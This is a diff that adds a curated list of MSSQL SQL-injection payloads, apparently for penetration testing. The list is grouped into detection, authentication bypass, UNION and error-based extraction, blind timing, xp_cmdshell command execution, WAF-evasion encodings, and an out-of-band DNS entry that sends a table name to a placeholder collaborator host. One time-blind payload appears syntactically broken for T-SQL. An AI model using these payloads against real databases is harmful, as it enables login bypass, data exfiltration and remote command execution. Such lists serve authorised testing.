@@ -1,0 +1,43 @@
+# MSSQL SQLi — SOTA curated
+# Full lists: sqli/mssql-blind-where.txt, sqli/error-based.txt, sqli/union-select.txt (PAT sync)
+
+# Detection
+'
+' OR '1'='1'--
+') OR ('1'='1'--
+
+# Auth bypass
+admin'--
+' OR 1=1--
+' OR 'x'='x'--
+
+# UNION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
+
+# Error-based
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--
+
+# Boolean blind
+' AND 1=1--
+' AND 1=2--
+
+# Time blind
+'; WAITFOR DELAY '0:0:5'--
+' OR IF(1=1,WAITFOR DELAY '0:0:5',0)--
+1; WAITFOR DELAY '0:0:5'--
+
+# Stacked / RCE paths
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC master..xp_dirtree '//COLLAB.subdomain/a'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+
+# OAST DNS
+'; DECLARE @p varchar(1024);SET @p=(SELECT TOP 1 name FROM sysobjects);EXEC('master..xp_dirtree "//'+@p+'.COLLAB.subdomain/a"')--
+
+# WAF bypass
+'/**/OR/**/1=1--
+'%0AOR%0A1=1--
